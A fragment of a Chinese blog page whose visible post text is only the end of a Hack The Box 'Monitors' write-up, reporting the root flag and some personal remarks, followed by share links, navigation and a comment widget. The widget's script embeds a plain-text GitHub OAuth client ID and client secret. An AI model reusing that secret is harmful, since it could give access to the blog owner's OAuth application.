+<p>成功获得root权限的flag</p>
+<p>收工睡觉</p>
+<p>这几天没有更新，是因为被某厂恶心了一把，让我自我怀疑了一下以为我自己真的很菜。</p>
+<p>但经过我时候以后发现，其实我更菜！</p>
+<p>没想到吧，哎嘿</p>
+<p>发现我自己更菜以后，我就可以放心的睡觉了，大家晚安</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/&title=《Monitors - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/&title=《Monitors - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Monitors - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/07/06/Hackthebox/Hackthebox-Explore/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Explore - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Breadcrumbs - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/&title=《Monitors - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/&title=《Monitors - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Monitors - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/24/Hackthebox/Hackthebox-Monitors/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACu0lEQVR42u3a0U7rMBAE0P7/T4PEEwiaO7MbF6508lS1TeKTSvZ21o9HfLx9HJ9ff37n+/vPjuT7yRhuPvDw8PBGQ7++2bN3rvHXV3s26Pys6AHh4eHhHeO1i0Fy42TQ+b2uH8rT9/Hw8PB+lZfXrrOJPh8DHh4e3v/L2wQKxRDx8PDw/iRvHx+0A3qLjxdlLXh4eHgxb9YA+93Xx/t7eHh4eKOueh685hN3GxCvRouHh4d3gJfHrG1k0LbEkivMQmQ8PDy8c7wcPJvuc0AeQEThCB4eHt4xXrskJOFpXo7nS0tS6OPh4eGd5uWl8LmcOG+VtY03PDw8vHO8TSk8O3JMXvQXLTE8PDy8EW9TFrdDaQPZ9gf44S54eHh4B3ibge6DiXzVyle2OozAw8PD29bMwwJ6M5S2Er4tLsHDw8Mb8TZbSDe3z5eQutH1/R8DHh4e3q28fZv/rnI8v35yFh4eHt453okmfT6Vt43/5MpfvoOHh4d3gNeWp22jKy+m81K7HQkeHh7eCV5+g3bxyJeB/NFcLwZRfw8PDw9vzctbXMNOWgxu492ipMbDw8O7iTcrbe9tic22LETn4uHh4R3gJX/y2wBiFjHsr1OvRXh4eHgLXhuVbqb1dgGYLU54eHh4r+G10/FmKp+1wfKI5GlKjYeHh7fmtYD8mC0t7eOIshY8PDy8Y7zkhH3BnVw/KayjshsPDw/vAC/HnPs0iXE32xHw8PDw7uXNCuVZXDtrod0cRuDh4eGteZvJt8W0D64t3G/ePYGHh4d3Oao8kL03qG3xye+Dh4eH90pem2EMb1Zut8qbXvXHeHh4eC/htdN6EhAkkW6+zPzwTTw8PLw/wCu2PZWtr9nS8o9r4uHh4R3j7af+fTGdbCa4jn3rDQR4eHh4I17bANs09duYI9899dgceHh4eCnvHWEic6jxGO+yAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
